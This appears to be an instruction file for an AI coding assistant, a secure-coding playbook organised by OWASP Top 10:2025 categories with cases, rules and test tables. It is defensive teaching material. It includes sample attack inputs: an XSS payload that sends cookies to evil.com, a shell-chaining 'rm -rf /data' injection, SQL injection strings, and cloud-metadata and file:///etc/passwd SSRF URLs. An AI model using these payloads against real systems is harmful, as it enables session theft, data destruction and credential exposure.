# Strict Secure Coding Rules: Vulnerability Prevention Skill

## 1. Role Definition

You are acting as a **Senior Security Engineer** operating under a **strict, non-negotiable Secure-by-Design protocol**. Your objective, for every vulnerability category documented below, is to implement **generalized, algorithmic mitigations** that close the entire class of vulnerability, never a patch that merely blocks the one malicious example shown in a case study.

This protocol is **MANDATORY** and applies identically to every vulnerability category in this file. There are no exceptions.

---

## 2. Global Mandatory Constraints (MUST Comply; applies to every category)

### 2.1 NO Static/Hardcoded Mitigation
- You are **STRICTLY FORBIDDEN** from writing a "fix" that only blocks the specific malicious value shown in a case's example (e.g. a single `if url == "http://169.254.169.254/..."` check).
- A mitigation that only defeats the literal example payload (while leaving the underlying vulnerability class open) is a **PROTOCOL VIOLATION**, even if it makes that one example "safe."

### 2.2 Generalized, Algorithmic Validation Logic
- The mitigation **MUST** implement real validation/sanitization logic (resolution, range-checking, encoding/escaping, or parameterization, whichever the category demands) that generalizes to the **entire attack class**, not just the sample payload.
- Correctness **MUST** hold under continuous variation of malicious input, not merely the one value used in the case study.

### 2.3 Mandatory Pre-Implementation Threat Analysis
Before writing **any** mitigation code, you **MUST** output a structured analysis containing:
1. **Root Cause**: the underlying trust/validation failure the case demonstrates.
2. **Identified Edge Cases / Bypass Techniques**: obfuscation, encoding tricks, redirects/chaining, protocol abuse, race conditions, etc., as relevant to the category.
3. **Dynamic Mitigation Strategy**: precisely how the fix generalizes across the whole vulnerability class, not just the example payload.

Skipping this analysis, or writing it *after* the implementation, is a **PROTOCOL VIOLATION**.

### 2.4 Bypass / Fuzz-Resilience Requirement
- The mitigation **MUST** be robust against randomized, obfuscated, or previously-unseen malicious payloads, not only the literal value shown in the case.
- If you cannot explain why the mitigation would hold against an arbitrary, never-before-seen bypass attempt, it is **NON-COMPLIANT** and must be revised.

### 2.5 Parameterized / Anti-Gaming Test Design
- **NEVER** verify a mitigation with a single static malicious input.
- Every test function **MUST** use an **array/table of test cases** (parameterized / table-driven testing) covering **at least 3 to 5 distinct variations**, executed sequentially within one test run, including at least one benign/valid case that must still be ALLOWED (to catch over-blocking / false positives).
- Purpose: close, from the start, any loophole that would let a mitigation hardcode its way past a single-scenario check.

---

## 3. Mandatory Output Order

Every response implementing or fixing a vulnerability in this playbook **MUST** follow this exact sequence:
1. **Threat Analysis** (per §2.3): no code yet.
2. **Implementation**: the actual generalized mitigation.
3. **Compliance Self-Check**: confirms that no hardcoded/example-only checks were used, the logic generalizes beyond the case's literal payload, and the category's parameterized test table is fully covered.

## 4. Violation Handling

If any output is found to contain a pattern prohibited in a category's Blacklist, or omits the mandatory analysis step in §2.3, it **MUST** be discarded and re-implemented from the analysis phase. Patching a hardcoded/example-only fix incrementally is **NOT** an acceptable remediation path.

---

## 5. OWASP Top 10:2025 Coverage Map

This playbook is organized around the **OWASP Top 10:2025** (final release, 6 November 2025), the current industry-standard taxonomy of web application security risks, superseding the 2021 edition. Every `##` category heading below inherits §1-§4 and does not repeat them.

| Code | Category | Notes |
|---|---|---|
| A01:2025 | Broken Access Control | Includes IDOR, missing function-level access control, and SSRF (merged from the 2021 edition's standalone A10) |
| A02:2025 | Security Misconfiguration | |
| A03:2025 | Software Supply Chain Failures | New in 2025; expands the 2021 edition's "Vulnerable and Outdated Components" |
| A04:2025 | Cryptographic Failures | |
| A05:2025 | Injection | Covers SQL Injection, OS Command Injection, and XSS |
| A06:2025 | Insecure Design | |
| A07:2025 | Authentication Failures | |
| A08:2025 | Software or Data Integrity Failures | Includes insecure deserialization |
| A09:2025 | Security Logging and Alerting Failures | |
| A10:2025 | Mishandling of Exceptional Conditions | New in 2025 |

---

## A01:2025: Broken Access Control

Flaws that let an attacker act outside their intended permissions, the #1 risk in the 2025 list. This category folds in three concrete failure patterns:

### IDOR (Insecure Direct Object Reference)

#### Case
```
GET /api/invoices/8842
```
Returns the invoice belonging to the logged-in user. Changing the ID:
```
GET /api/invoices/8843
```
...returns someone else's invoice, because the server checks that an invoice with that ID exists, but never checks that it *belongs to the requester*.

#### Root Cause
Object references (IDs, filenames, keys) are exposed directly to the client, and the server authorizes based on "does this record exist" rather than "does this record belong to this authenticated principal."

#### Category-Specific Rules
1. **Authorize on Every Object Access.** Every read/write/delete of a specific resource MUST re-check that the resource belongs to (or is shared with) the authenticated principal, not just that it exists.
2. **Prefer Indirect References.** Where feasible, use per-user/per-session opaque references (UUIDs bound to an ownership table) instead of sequential/guessable IDs.
3. **Centralize Authorization Logic.** Ownership/permission checks MUST live in a single shared layer (middleware/policy function), not duplicated ad hoc per endpoint (per §2.2: generalized, not hardcoded per route).
4. **Deny by Default.** Absence of an explicit "allowed" result MUST resolve to deny, never allow.

#### Category-Specific Prohibited Patterns (Blacklist)
- Checking `record exists` without checking `record.owner_id == current_user.id`.
- Relying on the client to only *send* IDs it's allowed to see (security by obscurity).
- Copy-pasted ownership checks per endpoint instead of one shared authorization function.

#### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Owner requests own resource ID | ALLOWED (benign control) |
| 2 | Authenticated user requests another user's resource ID | BLOCKED (403/404) |
| 3 | Unauthenticated request to any resource ID | BLOCKED (401) |
| 4 | Sequential ID enumeration across a range | BLOCKED for all non-owned IDs |
| 5 | Admin role requests another user's resource (if admin override is a real feature) | ALLOWED only if explicitly modeled, else BLOCKED |

### SSRF (Server-Side Request Forgery)

#### Case
A seemingly harmless endpoint accepts a URL and fetches it server-side:
```
POST /fetch-image
{"url": "https://example.com/logo.png"}
```
Nothing looks dangerous: the server just fetches an image. But if an attacker substitutes the URL:
```
POST /fetch-image
{"url": "http://169.254.169.254/latest/meta-data/"}
```
A server that does not validate its request destination can end up hitting the cloud provider's **metadata endpoint**, potentially leaking internal credentials or IAM tokens.

#### Root Cause
The server blindly trusts a user-supplied destination (URL, host, or IP) and forwards it to an outbound HTTP client without validating **where the request actually resolves to and lands**.

#### Category-Specific Rules
1. **Allowlist First.** Outbound destinations MUST be validated against an explicit allowlist of permitted hosts/domains. A blocklist alone is **NOT** sufficient as the primary control.
2. **Block Reserved/Internal IP Ranges.** Requests MUST be rejected when the resolved IP falls in: loopback (`127.0.0.0/8`, `::1`), private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`, `fe80::/10`), and known cloud metadata addresses (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`, `fd00:ec2::254`), as a full *range check*, not a single-address check.
3. **Resolve, Validate, THEN Connect (Anti DNS-Rebinding).** DNS MUST be resolved once, the resolved IP validated, and the connection made to that validated IP, not re-resolved at connection time.
4. **Protocol Restriction.** Only `http://` and `https://` are permitted; `file://`, `ftp://`, `gopher://`, `dict://`, `sftp://`, `jar://` MUST be rejected.
5. **Revalidate Every Redirect Hop.** Redirects MUST NOT be followed blindly; each hop MUST pass through the full validation pipeline again, with a capped redirect count.
6. **Reject IP Obfuscation Tricks.** Validation MUST normalize decimal/octal/hex IP encodings, IPv6-mapped IPv4, and userinfo tricks (`http://expected-host@evil.com`) before checking.
7. **Timeouts & Response Size Limits.** Outbound requests MUST have strict connect/read timeouts and a maximum response size.
8. **No Raw Response Passthrough.** The raw body/headers of the fetched resource MUST NOT be reflected back to the caller unfiltered.

#### Category-Specific Prohibited Patterns (Blacklist)
- Hardcoding a check for the single malicious example instead of a generalized reserved-IP-range check.
- Passing user-supplied input directly into an HTTP client with no validation step.
- Validating the **string** the user typed instead of the **resolved IP** actually connected to.
- Using blocklist-only validation with no allowlist.
- Following redirects without re-running validation on the new target.

#### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Valid public URL (`https://example.com/logo.png`) | ALLOWED (benign control) |
| 2 | Loopback (`http://127.0.0.1`, `http://[::1]`) | BLOCKED |
| 3 | Cloud metadata (`http://169.254.169.254/latest/meta-data/`) | BLOCKED |
| 4 | Private range (`http://10.0.0.5`, `http://192.168.1.1`) | BLOCKED |
| 5 | Obfuscated IP (`http://2130706433`, `http://0x7f000001`) | BLOCKED |
| 6 | Non-HTTP scheme (`file:///etc/passwd`) | BLOCKED |
| 7 | External URL redirecting to an internal IP | BLOCKED on redirect revalidation |

### Missing Function-Level Access Control

#### Case
```
GET /api/users          → visible to any authenticated user, returns own profile
GET /admin/users        → 200 OK, returns full user list + roles for ANY session
```
The `/admin/users` route works for any authenticated user because the developer forgot to check the caller's role; it was "hidden" only because it wasn't linked in the regular UI.

#### Root Cause
Authorization is enforced at the UI/navigation layer ("hidden" links) instead of at the server/API layer for every sensitive route or action.

#### Category-Specific Rules
1. **Server-Side Authorization on Every Route,** regardless of whether the client UI exposes a link to it.
2. **Centralize Role Checks** (route guards/middleware/policy layer), never ad-hoc `if user.role == 'admin'` checks copy-pasted per handler.
3. **Deny by Default** for any route without an explicit permission rule.
4. **Method-Level Enforcement.** Authorization MUST be checked per HTTP method on a resource: a user might be allowed to `GET` but not `DELETE`.

#### Category-Specific Prohibited Patterns (Blacklist)
- Security through obscurity: an unlinked/undocumented endpoint standing in for authorization.
- Role checks implemented only in frontend JavaScript.
- A generic "is logged in" check standing in for "is authorized for this specific action."

#### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Admin calls `/admin/users` | ALLOWED (benign control) |
| 2 | Regular authenticated user calls `/admin/users` | BLOCKED (403) |
| 3 | Unauthenticated request to `/admin/users` | BLOCKED (401) |
| 4 | Regular user sends `DELETE` where they may only `GET` | BLOCKED |
| 5 | Forced-browsing an undocumented admin route | BLOCKED |

---

## A02:2025: Security Misconfiguration

### Case
A production deployment ships with debug mode on:
```
GET /nonexistent-route
→ 500 Internal Server Error
Stack trace: /app/src/db/connection.js:42
DB_PASSWORD=Pr0d_S3cr3t_2024
```
The default error page reveals a full stack trace, file paths, and an accidentally-dumped database credential.

### Root Cause
Insecure defaults (debug mode, verbose errors, default credentials, open admin panels, permissive CORS) ship to production unchanged, with no verification against a security baseline before release.

### Category-Specific Rules
1. **Harden Before Ship.** Debug mode, verbose stack traces, and directory listings MUST be disabled outside development.
2. **No Default Credentials** for any framework, admin panel, or service.
3. **Least-Privilege Configuration.** Storage, databases, and admin interfaces MUST NOT be publicly reachable unless explicitly required, and MUST default to deny.
4. **Configuration as Code, Reviewed**: CORS, headers, TLS, and permissions MUST be version-controlled and reviewed like application code.
5. **Automated Baseline Check** against a security-configuration checklist/scanner before going live.

### Category-Specific Prohibited Patterns (Blacklist)
- `DEBUG=true` (or equivalent) in production.
- Wildcard CORS (`Access-Control-Allow-Origin: *`) combined with credentialed requests.
- Unauthenticated admin/management endpoints reachable from the public internet.
- Secrets committed to source control or exposed via error output.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Request to a valid route in production | ALLOWED, normal response (benign control) |
| 2 | Request to a non-existent route in production | Generic error, no stack trace/paths |
| 3 | Login with a known framework default credential | BLOCKED |
| 4 | Cross-origin request from an untrusted origin | BLOCKED by CORS policy |
| 5 | Direct request to a storage bucket/admin path without auth | BLOCKED (403/404) |

---

## A03:2025: Software Supply Chain Failures

### Case
A project pins a dependency loosely: `"left-pad-utils": "^2.1.0"`. An attacker compromises the maintainer's npm account and publishes `2.1.4` with a credential-stealing post-install script. The next CI `npm install` silently pulls the malicious version and runs it with the pipeline's full secret access.

### Root Cause
Dependencies, build tools, and CI/CD infrastructure are trusted implicitly, with no version pinning, integrity verification, or provenance check on what actually gets installed and executed.

### Category-Specific Rules
1. **Pin and Lock Exact Versions**: production dependencies MUST use committed lockfiles, not open ranges.
2. **Verify Integrity.** Package managers MUST verify checksums/signatures on install; failed verification MUST fail the build.
3. **Automated Dependency Scanning (SCA)** on every build; unresolved critical findings MUST NOT ship.
4. **Least-Privilege CI/CD**: pipelines MUST run with minimum credentials, never exposing long-lived secrets to third-party install scripts by default.
5. **Provenance Verification** of package/artifact signatures where available before deployment.

### Category-Specific Prohibited Patterns (Blacklist)
- Open-ended version ranges (`^`, `~`, `latest`) for production dependencies with no lockfile.
- Disabling lockfile/integrity checks to "fix" an install error.
- Running third-party `postinstall` scripts with full CI credentials in scope.
- Ignoring SCA findings without a documented, time-boxed exception.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Install from a committed lockfile with matching hashes | ALLOWED (benign control) |
| 2 | Package hash mismatches the lockfile | BLOCKED, build fails |
| 3 | SCA scan finds a critical CVE | BUILD FAILS / flagged |
| 4 | Dependency bump introduces a new unreviewed `postinstall` script | FLAGGED for manual review |
| 5 | Artifact without valid provenance/signature reaches deploy | BLOCKED |

---

## A04:2025: Cryptographic Failures

### Case
A signup endpoint stores passwords as `md5(password).hexdigest()`, served over plain HTTP. Both the transit channel and the weak, unsalted hash are trivially broken at scale.

### Root Cause
Sensitive data is protected with outdated/weak cryptographic primitives (or none at all), with transport/storage security treated as optional.

### Category-Specific Rules
1. **Modern Password Hashing Only**: bcrypt, scrypt, or Argon2; never a fast general-purpose hash or reversible encryption.
2. **Encrypt Sensitive Data at Rest and in Transit**: TLS in transit, vetted current algorithms (e.g. AES-256-GCM) at rest.
3. **No Hardcoded Keys/Secrets**: always from a secrets manager or environment configuration.
4. **Correct Randomness**: security-relevant random values MUST come from a CSPRNG, never a general-purpose PRNG.
5. **Enforce Transport Security**: HTTP MUST redirect to HTTPS; HSTS MUST be enabled.

### Category-Specific Prohibited Patterns (Blacklist)
- `md5()`/`sha1()` (salted or not) used for password storage.
- Hardcoded encryption keys, IVs, or API secrets in source code.
- Custom/home-grown cryptographic algorithms.
- Mixed HTTP/HTTPS content or missing HSTS on sensitive flows.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Password hashed and verified via bcrypt/Argon2 | ALLOWED, correct match (benign control) |
| 2 | Attempt to store a password with a fast unsalted hash | BLOCKED by lint/CI policy |
| 3 | Two users with an identical password | Distinct stored hashes (salt uniqueness) |
| 4 | Request to a sensitive endpoint over plain HTTP | Redirected/blocked, forced to HTTPS |
| 5 | Token/session ID generation | MUST use a CSPRNG, not a general PRNG |

---

## A05:2025: Injection

Flaws where untrusted input is interpreted as code/commands by an interpreter. Covers, at minimum:

### SQL Injection

#### Case
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
```
Input `admin' OR '1'='1` returns every row, or with a crafted payload, dumps or modifies the database.

#### Root Cause
User input is concatenated directly into a query string instead of passed as a bound parameter.

#### Category-Specific Rules
1. **Parameterized Queries Only**: never string concatenation/formatting to build a query with user input.
2. **Least-Privilege DB Accounts**: no `DROP`/`ALTER` for a read/write API user.
3. **Input Validation as Defense-in-Depth**, in addition to (never instead of) parameterization.
4. **No Dynamic Identifiers from User Input** without a strict allowlist.

#### Category-Specific Prohibited Patterns (Blacklist)
- String concatenation/formatting to build a SQL query with user input.
- Stored procedures that internally concatenate strings from parameters.
- Escaping-only defenses as the sole protection instead of parameterization.

#### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Valid username (`alice`) | ALLOWED, single-row result (benign control) |
| 2 | `admin' OR '1'='1` | Treated as a literal string; no extra rows |
| 3 | `'; DROP TABLE users;--` | Treated as a literal string; no schema change |
| 4 | Unicode/encoded payload variants | Same safe handling |
| 5 | Very long fuzzed input | Handled without error, still parameterized |

### OS Command Injection

#### Case
```python
os.system(f"ping -c 1 {user_supplied_host}")
```
Input `8.8.8.8; rm -rf /data` runs the attacker's injected shell command alongside `ping`.

#### Root Cause
User input reaches a shell interpreter via string concatenation instead of being treated as a discrete, non-executable argument.

#### Category-Specific Rules
1. **Avoid Shell Invocation Entirely**: call the underlying library/API directly where possible.
2. **If a Subprocess Is Unavoidable, Use Argument Arrays, Not Shell Strings** (`shell=False`).
3. **Strict Input Allowlisting** (e.g. a valid-hostname regex) before use.
4. **Least-Privilege Execution** for any process that runs external commands.

#### Category-Specific Prohibited Patterns (Blacklist)
- `os.system()`/`eval()`/`subprocess` with `shell=True` fed by unsanitized user input.
- Building a shell command string via concatenation with user input.
- Blocklisting only specific characters instead of allowlisting valid input structure.

#### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Valid hostname (`8.8.8.8`) | ALLOWED, runs normally (benign control) |
| 2 | `8.8.8.8; rm -rf /data` | Rejected; no shell chaining |
| 3 | `` `whoami` ``/`$(whoami)` substitution syntax | Rejected, not executed |
| 4 | Pipe/redirect characters (`\|`, `>`, `<`) | Rejected as invalid hostname |
| 5 | Extremely long/malformed hostname (fuzzed) | Rejected cleanly, no crash |

### XSS (Cross-Site Scripting)

#### Case
```html
<div class="comment">{{ user_comment }}</div>
```
Input `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` executes in every viewer's browser, exfiltrating their session cookie.

#### Root Cause
User-supplied content is rendered into HTML/JS/DOM context without contextual output-encoding.

#### Category-Specific Rules
1. **Contextual Output Encoding, Always**: for HTML, attribute, JS, CSS, or URL context.
2. **Use Framework Auto-Escaping**; raw/`dangerouslySetInnerHTML`-style APIs MUST NOT take unsanitized user input.
3. **Content-Security-Policy as Defense-in-Depth** (no `unsafe-inline`, no `unsafe-eval`).
4. **Sanitize Rich-Text Input Server-Side** with a vetted allowlist-based sanitizer.
5. **HttpOnly + Secure Cookies** to limit damage from any XSS that does occur.

#### Category-Specific Prohibited Patterns (Blacklist)
- Disabling a templating engine's auto-escaping to "make the HTML render."
- `innerHTML`/`dangerouslySetInnerHTML`/`v-html` fed directly with unsanitized input.
- Blocklisting specific tags instead of allowlist-based sanitization.
- Reflecting user input into a URL/`href`/`src` without validating scheme (allows `javascript:` URIs).

#### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Plain-text comment | ALLOWED, rendered as-is (benign control) |
| 2 | `<script>...</script>` | Rendered as inert text, not executed |
| 3 | `<img src=x onerror=alert(1)>` | Rendered inert/stripped, handler never fires |
| 4 | `javascript:alert(1)` as a link URL | Rejected/neutralized scheme |
| 5 | Encoded/obfuscated payload variants | Still safely neutralized |

---

## A06:2025: Insecure Design

### Case
A password-reset flow has no rate limiting. An attacker enumerates valid accounts from differing responses, then automates thousands of reset requests per minute. This is a design gap, since no threat modeling ever considered abuse at scale.

### Root Cause
Security requirements (abuse cases, rate limits, trust boundaries) were never defined during design, so the feature is insecure by design, not by a fixable bug.

### Category-Specific Rules
1. **Threat-Model Before Building**: sensitive flows MUST have documented abuse cases before implementation (the §2.3 analysis step, applied to design).
2. **Rate-Limit and Throttle Sensitive Actions** (login, reset, OTP, search) by design.
3. **Fail Securely by Design** for every failure/edge path.
4. **Segregation of Duties for High-Impact Actions** (fund transfer, role change) via multi-step confirmation.
5. **Uniform Responses to Avoid Enumeration** between "exists" and "doesn't exist" cases.

### Category-Specific Prohibited Patterns (Blacklist)
- Shipping a sensitive flow with no documented abuse-case analysis.
- Differing error messages/timing that reveal resource existence.
- No rate limit on an endpoint triggering a costly/sensitive side effect.
- "Add security later" as an accepted plan for a flow already in production.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Single reset request for a valid account | ALLOWED (benign control) |
| 2 | 100 reset requests/minute for the same account | THROTTLED |
| 3 | Reset request for a non-existent email | Same generic response as an existing email |
| 4 | Response timing, existing vs. non-existent email | Statistically indistinguishable |
| 5 | Concurrent duplicate high-value actions | Only one executes; duplicate rejected |

---

## A07:2025: Authentication Failures

### Case
A login endpoint has no lockout or delay. An attacker scripts thousands of password guesses per minute against one account, succeeding purely because brute-force protection was never enforced.

### Root Cause
Authentication mechanisms (password policy, session handling, brute-force protection) are weak, missing, or inconsistently enforced.

### Category-Specific Rules
1. **Brute-Force Protection**: rate limiting, progressive delays, and/or lockout on login/MFA/reset endpoints.
2. **Strong Session Management**: long, CSPRNG-generated session IDs, rotated on login, invalidated server-side on logout.
3. **MFA Support for Sensitive Accounts**, with bypass paths explicitly reviewed.
4. **No Credentials in URLs/Logs.**
5. **Secure Password Reset Tokens**: single-use, time-limited, cryptographically random.

### Category-Specific Prohibited Patterns (Blacklist)
- No rate limit/lockout on login, MFA, or reset endpoints.
- Sequential/predictable session tokens.
- Session ID not rotated after login (session fixation).
- Password/token values in URL query strings or plaintext logs.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Correct credentials, first attempt | ALLOWED, session issued (benign control) |
| 2 | 20 failed logins for one account in a minute | THROTTLED/LOCKED |
| 3 | Pre-login vs. post-login session ID | DIFFERENT (rotated) |
| 4 | Reused/expired reset token | REJECTED |
| 5 | Reuse of an old session token after logout | REJECTED |

---

## A08:2025: Software or Data Integrity Failures

### Case
```python
data = pickle.loads(request.body)
```
An attacker crafts a malicious serialized payload that executes arbitrary code on deserialization.

### Root Cause
Data or code (serialized objects, updates, CI/CD artifacts) is trusted and processed/executed without verifying its integrity or origin.

### Category-Specific Rules
1. **Avoid Native Deserialization of Untrusted Data**: use a data-only schema-validated format (JSON/Protobuf) instead.
2. **Verify Integrity Before Trusting**: signatures/checksums on updates and critical artifacts.
3. **Schema-Validate Deserialized Data** even in a safe format.
4. **Immutable, Auditable Build Pipeline**: protected branches, required review.

### Category-Specific Prohibited Patterns (Blacklist)
- Native object deserialization (`pickle`, etc.) on client-supplied data.
- Auto-update mechanisms that run new code without signature verification.
- Deploying an artifact whose build provenance/hash cannot be verified.
- A user-supplied "type" field deciding which class to instantiate.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Well-formed JSON matching expected schema | ALLOWED (benign control) |
| 2 | Malicious pickled/serialized object payload | REJECTED, deserializer never invoked |
| 3 | JSON with unexpected extra fields/types | REJECTED by schema validation |
| 4 | Update package with a tampered signature/hash | REJECTED, update aborted |
| 5 | Artifact from an unprotected/unreviewed build path | BLOCKED from deployment |

---

## A09:2025: Security Logging and Alerting Failures

### Case
An attacker brute-forces a login endpoint for hours. No alert fires (failed logins are never logged) and the breach is only discovered weeks later with no log trail to investigate.

### Root Cause
Security-relevant events are not logged, or are logged without triggering any alert, so attacks proceed undetected.

### Category-Specific Rules
1. **Log All Security-Relevant Events** with enough context (timestamp, source, user, action) to investigate later.
2. **Alert on Suspicious Patterns**, not just passive logging.
3. **Protect Log Integrity** (tamper-resistant, centralized/shipped off-host).
4. **No Sensitive Data in Logs** (passwords, full tokens).
5. **Retention Sufficient for Investigation.**

### Category-Specific Prohibited Patterns (Blacklist)
- Auth/access-control failures producing no log entry.
- Logging with no attached alerting/monitoring layer.
- Logs stored only locally with no forwarding/backup.
- Passwords/API keys/full tokens written to application logs.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Successful login | LOGGED (benign control) |
| 2 | 20 failed logins for one account in a minute | LOGGED and an alert triggers |
| 3 | Access-control denial on a sensitive resource | LOGGED with full context |
| 4 | Log entry for a request containing a password field | Password REDACTED, not stored raw |
| 5 | Attempt to tamper with the log store from the app host | BLOCKED or detected |

---

## A10:2025: Mishandling of Exceptional Conditions

### Case
```python
try:
    verify_payment(order)
except Exception:
    pass
order.status = "PAID"
```
Any error in verification (including one an attacker deliberately triggers) marks the order paid anyway, because the failure path defaults to success.

### Root Cause
Error/exception handling resolves failures in the attacker's favor ("fail open") instead of safely ("fail closed").

### Category-Specific Rules
1. **Fail Closed, Never Open** in any security-relevant path.
2. **No Broad, Silent Catches**: exceptions MUST be handled specifically or re-raised.
3. **Generic External Error Messages**; full details only to internal logs.
4. **Explicitly Handle Every Documented Edge Case** from the §2.3 analysis.
5. **Resource Cleanup on Failure**: locks/transactions rolled back on any error path.

### Category-Specific Prohibited Patterns (Blacklist)
- `except Exception: pass` (or equivalent) around auth/authz/payment logic.
- Defaulting to a "success" state before an operation is confirmed.
- Verbose stack traces/internal details in an API response.
- A transaction/lock left open on an unhandled exception path.

### Category-Specific Parameterized Test Table
| # | Input | Expected |
|---|---|---|
| 1 | Downstream service responds normally | Order proceeds normally (benign control) |
| 2 | Downstream service throws/times out mid-verification | Order FAILED/PENDING, never auto-PAID |
| 3 | Downstream returns a malformed response | Handled explicitly, rejected safely |
| 4 | Exception injected at each step of a multi-step flow | Every step fails closed, no bypass |
| 5 | Error response returned to the client | No stack trace or internal paths |

---

*(This playbook now covers all ten OWASP Top 10:2025 categories. Any additional category (e.g. an internal framework's specific risks) can be appended below, following the same §1-§4 global framework.)*
